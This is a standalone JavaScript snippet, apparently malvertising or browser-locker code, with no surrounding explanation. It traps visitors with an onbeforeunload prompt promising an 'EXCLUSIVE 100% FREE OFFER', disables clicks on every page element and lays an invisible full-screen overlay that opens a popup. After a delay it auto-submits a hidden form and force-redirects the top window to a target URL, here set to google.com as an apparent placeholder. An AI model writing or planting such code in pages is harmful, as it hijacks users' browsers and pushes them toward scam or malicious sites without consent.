(function(targetUrl) {
    function getTop() {
        var isTop = 0;
        try {
            if (top == self)
                isTop = 1;
        } catch (err) {
            isTop = err;
        }
        return isTop;
    }

    function setExit() {
        window.onbeforeunload = function() {
            setTimeout(function() {
                window.onbeforeunload = function() {};
                setTimeout(function() {
                    top.location.replace(unescape(targetUrl));
                }, 100);
            }, 5);
            return
                "Do you really want to leave this page and give up the \n\nEXCLUSIVE 100% FREE OFFER?\n\n";
        }
    }
    try {
        setExit();
    } catch (err) {}
    try {
        var all = document.getElementsByTagName("*");
        for (var i = 0, max = all.length; i < max; i++) {
            all[i].style.pointerEvents = "none";
        }
    } catch (err) {}

    function addInput(f, name, val) {
        var i1 = document.createElement('input');
        i1.setAttribute('type', 'hidden');
        i1.setAttribute('name', name);
        i1.setAttribute('value', val);
        f.appendChild(i1);
    }

    setTimeout(
        function() {
            try {
                window.onbeforeunload = function() {};
            } catch (err) {}
            try {
                var f = document.createElement('form');
                f.setAttribute('method', 'POST');
                var id = '_x' + Math.random().toString().replace('.', '');
                f.setAttribute('id', id);
                f.setAttribute('action', targetUrl);
                f.setAttribute('target', '_top');
                document.getElementsByTagName('body')[0].appendChild(f);
                document.getElementById(id).submit();
            } catch (err) {}
            setTimeout(function() {
                top.location.replace(targetUrl);
            }, 60 * 1000);

        }, 60 * 1000);

    var tid = setInterval(function() {
        if (!document.body) {
            return;
        };
        clearInterval(tid);
        var overlay = document.createElement('div');
        overlay.style.cssText =
            "position:absolute;top:0px;left:0px;width:100%;height:100%;opacity:0;z-index:2147483647;background:#000;";
        overlay.onclick = window.open(targetUrl);
        document.body.appendChild(overlay);
    }, 100);
})('http://google.com');
